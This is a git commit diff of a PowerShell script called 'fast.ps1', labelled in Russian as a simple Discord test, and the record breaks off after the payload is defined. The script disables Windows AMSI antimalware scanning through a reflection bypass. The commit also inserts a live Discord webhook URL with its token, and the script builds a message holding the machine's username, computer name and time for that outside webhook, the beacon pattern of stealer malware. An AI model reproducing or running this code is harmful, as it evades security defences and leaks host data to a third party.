31847b64bfcbeea1a01c52bb79829ee06fa393d5
amirchankambar234-crypto <amirchankambar234@gmail.com>
2026-04-17 17:08:51 +0500

    Update fast.ps1

--- fast.ps1
+++ fast.ps1
@@ -1,7 +1,7 @@
 # === ПРОСТОЙ ТЕСТ ДЛЯ DISCORD (2026) ===
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-$webhook = "https://discord.com/api/webhooks/ТОЙ_ПОЛНЫЙ_ВЕБХУК_URL_СЮДА"   # ← ВСТАВЬ СВОЙ ПОЛНЫЙ WEBHOOK
+$webhook = "https://discord.com/api/webhooks/1464644525132742688/Nklo9KcxdCsJF4wn7QX7JkqT5w4diK_iax_V1m_zoFJtStdrYBF6-FYsjSakPULKJW0T"   # ← ВСТАВЬ СВОЙ ПОЛНЫЙ WEBHOOK
 
 $payload = @{
 content = "✅ ТЕСТОВОЕ СООБЩЕНИЕ`nПользователь: $($env:USERNAME)`nПК: $($env:COMPUTERNAME)`nВремя: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
